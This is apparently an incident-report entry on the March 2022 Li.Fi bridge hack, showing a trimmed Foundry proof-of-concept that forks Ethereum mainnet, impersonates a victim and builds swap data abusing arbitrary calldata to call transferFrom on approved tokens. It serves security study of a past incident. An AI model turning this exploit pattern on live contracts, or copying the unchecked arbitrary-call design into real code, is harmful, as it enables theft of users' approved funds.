# [?] Li.Fi - Bridges

## Summary
Severity: Unknown
Chain: Ethereum
Component: LiFi
Published: 2022-03-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/LiFi_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    address from = address(0xC6f2bDE06967E04caAf4bF4E43717c3342680d76);
    address lifi = address(0x5A9Fd7c39a6C488E715437D7b1f3C823d5596eD1);
    address exploiter = address(0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_420_686); //fork mainnet at block 14420686
    }

    function testExploit() public {
        cheats.startPrank(from);

        // The Vulnerability
        // The hack took advantage of our pre-bridge swap feature. Our smart contract allows a caller to pass an array of multiple swaps using any address with arbitrary calldata.

        // This design gave us maximum flexibility in what DEXs we could call and what methods we could call. This also allowed anyone to call other contracts, not just DEXs. Our contract checks to make sure that the result of the swap or swaps is enough tokens to continue the bridging operation.

        // The attacker started by passing a legitimate swap of a small amount followed by multiple calls directly to various token contracts. Specifically, they called the `transferFrom` method which allowed the attacker to transfer funds from users’ wallets that had previously given infinite approval to our contract for that specific token.
        ILIFI.LiFiData memory _lifiData = ILIFI.LiFiData({
            transactionId: 0x1438ff9dd1cf9c70002c3b3cbec9c4c1b3f9eb02e29bcac90289ab3ba360e605,
            integrator: "li.finance",
            referrer: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            receivingAssetId: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            receiver: 0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E,
            destinationChainId: 42_161,
            amount: 50_000_000
        });
        ILIFI.SwapData[] memory _swapData = new ILIFI.SwapData[](38);
        _swapData[0] = ILIFI.SwapData({
            approveTo: 0xDef1C0ded9bec7F1a1670819833240f027b25EfF,
            callData: hex"d9627aa400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000002625a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            // sellToUniswap(address[],uint256,uint256,bool)
            // {
            //     "tokens":[
            //     0:"0xdac17f958d2ee523a2206206994597c13d831ec7"
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/LiFi_exp.sol_
